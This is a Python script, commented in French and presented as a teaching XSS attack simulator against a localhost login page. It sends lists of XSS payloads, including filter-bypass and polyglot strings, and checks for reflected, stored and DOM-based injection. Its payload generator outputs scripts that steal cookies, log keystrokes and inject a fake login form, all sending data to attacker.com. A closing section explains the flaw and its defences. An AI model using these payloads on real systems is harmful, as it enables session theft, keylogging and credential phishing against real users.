#!/usr/bin/env python3
"""
Attaque XSS (Cross-Site Scripting)
Injection de scripts malveillants dans les champs
"""

import requests
from colorama import Fore, Style, init
from bs4 import BeautifulSoup

init(autoreset=True)

TARGET_URL = "http://localhost/login"


def banner():
    print(f"""
{Fore.YELLOW}╔═══════════════════════════════════════════════════╗
║         🕷️  XSS ATTACK SIMULATOR                 ║
║              POUR TESTS PÉDAGOGIQUES              ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


XSS_PAYLOADS = [
    # XSS basiques
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    
    # XSS avancés
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    
    # Encodage
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    
    # Event handlers
    "<div onmouseover='alert(1)'>hover me</div>",
    "<a href='javascript:alert(1)'>click</a>",
    
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    
    # Bypass filters
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
]


def test_reflected_xss():
    """Teste XSS reflété dans les messages d'erreur"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          🔍 TEST XSS REFLÉTÉ                     ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Test: Injection dans les champs username/password{Style.RESET_ALL}\n")
    
    vulnerabilities_found = []
    
    for i, payload in enumerate(XSS_PAYLOADS[:10], 1):  # Limiter pour la démo
        print(f"{Fore.CYAN}[{i}/10] Test payload: {payload[:50]}...{Style.RESET_ALL}")
        
        try:
            # Test dans username
            response = requests.post(
                TARGET_URL,
                json={"username": payload, "password": "test"},
                timeout=5
            )
            
            # Vérifier si le payload est reflété dans la réponse
            if payload in response.text:
                print(f"{Fore.RED}    [!] VULNÉRABILITÉ XSS REFLÉTÉE DÉTECTÉE !{Style.RESET_ALL}")
                print(f"{Fore.RED}    [!] Le payload est reflété sans sanitisation{Style.RESET_ALL}")
                vulnerabilities_found.append({
                    'type': 'Reflected XSS',
                    'field': 'username',
                    'payload': payload
                })
            else:
                print(f"{Fore.GREEN}    [✓] Payload filtré ou non reflété{Style.RESET_ALL}")
        
        except Exception as e:
            print(f"{Fore.YELLOW}    [!] Erreur: {str(e)}{Style.RESET_ALL}")
    
    # Rapport
    print(f"\n{Fore.CYAN}═══════════════ RÉSULTAT ═══════════════{Style.RESET_ALL}")
    if vulnerabilities_found:
        print(f"{Fore.RED}[!] {len(vulnerabilities_found)} vulnérabilité(s) XSS détectée(s){Style.RESET_ALL}")
        for vuln in vulnerabilities_found:
            print(f"  • {vuln['type']} dans '{vuln['field']}'")
    else:
        print(f"{Fore.GREEN}[✓] Aucune vulnérabilité XSS reflétée détectée{Style.RESET_ALL}")


def test_stored_xss():
    """Teste XSS stocké (si les données sont sauvegardées)"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          💾 TEST XSS STOCKÉ                      ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Principe: Tenter de stocker un payload XSS dans MongoDB")
    print(f"qui sera exécuté quand un autre utilisateur consultera les données{Style.RESET_ALL}\n")
    
    payload = "<script>alert('XSS Stocké !')</script>"
    
    print(f"{Fore.CYAN}[*] Injection du payload: {payload}{Style.RESET_ALL}")
    
    try:
        # Tenter de créer un utilisateur avec XSS
        response = requests.post(
            TARGET_URL,
            json={"username": payload, "password": "test123"},
            timeout=5
        )
        
        print(f"{Fore.GREEN}[✓] Payload envoyé au serveur{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Si le payload est stocké dans MongoDB sans sanitisation,")
        print(f"[!] il sera exécuté lors de l'affichage sur le dashboard{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}Pour vérifier:")
        print(f"1. Connectez-vous au dashboard")
        print(f"2. Consultez la table 'users'")
        print(f"3. Si une alerte JavaScript s'affiche = XSS stocké réussi !{Style.RESET_ALL}")
    
    except Exception as e:
        print(f"{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")


def test_dom_xss():
    """Teste XSS basé sur le DOM"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          🌐 TEST XSS BASÉ SUR LE DOM             ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Principe: Exploiter le JavaScript côté client{Style.RESET_ALL}\n")
    
    dom_payloads = [
        "http://localhost/?redirect=javascript:alert('XSS')",
        "http://localhost/#<script>alert('XSS')</script>",
        "http://localhost/?name=<img src=x onerror=alert('XSS')>",
    ]
    
    for payload in dom_payloads:
        print(f"{Fore.CYAN}[*] Test URL: {payload}{Style.RESET_ALL}")
        try:
            response = requests.get(payload, timeout=5)
            print(f"{Fore.GREEN}    [✓] URL accessible{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}    [!] Erreur d'accès{Style.RESET_ALL}")


def create_xss_payload_generator():
    """Générateur de payloads XSS personnalisés"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║        🛠️  GÉNÉRATEUR DE PAYLOADS XSS            ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Choisissez le type de payload:")
    print("1. Alert simple")
    print("2. Vol de cookies")
    print("3. Redirection malveillante")
    print("4. Keylogger")
    print("5. Phishing (faux formulaire){Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-5): {Style.RESET_ALL}")
    
    payloads = {
        "1": "<script>alert('XSS Test')</script>",
        "2": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
        "3": "<script>window.location='http://malicious-site.com'</script>",
        "4": "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>",
        "5": """<script>
document.body.innerHTML='<h1>Session expirée</h1><form action=\"http://attacker.com/phish\" method=\"post\"><input name=\"user\" placeholder=\"Username\"><input name=\"pass\" type=\"password\" placeholder=\"Password\"><button>Connexion</button></form>';
</script>"""
    }
    
    if choice in payloads:
        print(f"\n{Fore.GREEN}[✓] Payload généré:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{payloads[choice]}{Style.RESET_ALL}")
        
        test = input(f"\n{Fore.CYAN}Tester ce payload ? (o/n): {Style.RESET_ALL}")
        if test.lower() == 'o':
            try:
                response = requests.post(
                    TARGET_URL,
                    json={"username": payloads[choice], "password": "test"},
                    timeout=5
                )
                print(f"{Fore.GREEN}[✓] Payload envoyé au serveur{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")


def explain_xss():
    """Explique la vulnérabilité XSS"""
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════╗
║          📚 EXPLICATION DE L'ATTAQUE XSS         ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.WHITE}🔍 Qu'est-ce qu'une attaque XSS ?

XSS = Cross-Site Scripting
Injection de scripts malveillants qui s'exécutent dans le navigateur
des autres utilisateurs.

📋 Types de XSS :

1. {Fore.YELLOW}XSS Reflété{Fore.WHITE}
   Le payload est immédiatement reflété dans la réponse
   Ex: Message d'erreur contenant l'input utilisateur

2. {Fore.YELLOW}XSS Stocké{Fore.WHITE} (le plus dangereux)
   Le payload est sauvegardé en base de données
   Ex: Commentaire avec <script> stocké dans MongoDB
   → S'exécute pour TOUS les utilisateurs qui consultent

3. {Fore.YELLOW}XSS DOM-based{Fore.WHITE}
   Exploite le JavaScript côté client
   Ex: URL avec paramètre injecté dans le DOM

🎯 Pourquoi votre application est vulnérable ?

1. {Fore.RED}Pas de sanitisation des inputs{Fore.WHITE}
   Les données utilisateur ne sont pas nettoyées

2. {Fore.RED}Stockage direct dans MongoDB{Fore.WHITE}
   Les payloads XSS sont sauvegardés tels quels

3. {Fore.RED}Affichage sans échappement dans le dashboard{Fore.WHITE}
   dashboard.html affiche les données sans innerHTML protection

💥 Impacts possibles :

• Vol de session (cookies)
• Redirection vers sites malveillants
• Keylogging (enregistrement des touches)
• Défacement (modification de la page)
• Phishing (faux formulaires)
• Propagation de malware

🛡️ Comment se protéger ?

1. {Fore.GREEN}Sanitiser TOUTES les entrées utilisateur{Fore.WHITE}
   → Utiliser DOMPurify, bleach, etc.

2. {Fore.GREEN}Encoder les sorties{Fore.WHITE}
   → textContent au lieu de innerHTML
   → Jinja2 autoescaping en Python

3. {Fore.GREEN}Content Security Policy (CSP){Fore.WHITE}
   → Header HTTP interdisant scripts inline

4. {Fore.GREEN}Validation stricte côté serveur{Fore.WHITE}
   → Whitelist de caractères autorisés

5. {Fore.GREEN}HTTPOnly cookies{Fore.WHITE}
   → Empêche JavaScript d'accéder aux cookies

Exemple de correction dans dashboard.html:
{Fore.RED}❌ element.innerHTML = userData{Fore.WHITE}
{Fore.GREEN}✓ element.textContent = userData{Style.RESET_ALL}
    """)


def main():
    banner()
    
    print(f"{Fore.WHITE}Sélectionnez le type de test XSS:")
    print("1. XSS Reflété (dans les réponses)")
    print("2. XSS Stocké (dans MongoDB)")
    print("3. XSS DOM-based")
    print("4. Générateur de payloads XSS")
    print("5. Tous les tests")
    print("6. Explication de la vulnérabilité")
    print("7. Quitter{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-7): {Style.RESET_ALL}")
    
    if choice == "1":
        test_reflected_xss()
    elif choice == "2":
        test_stored_xss()
    elif choice == "3":
        test_dom_xss()
    elif choice == "4":
        create_xss_payload_generator()
    elif choice == "5":
        test_reflected_xss()
        test_stored_xss()
        test_dom_xss()
    elif choice == "6":
        explain_xss()
    elif choice == "7":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Test interrompu{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")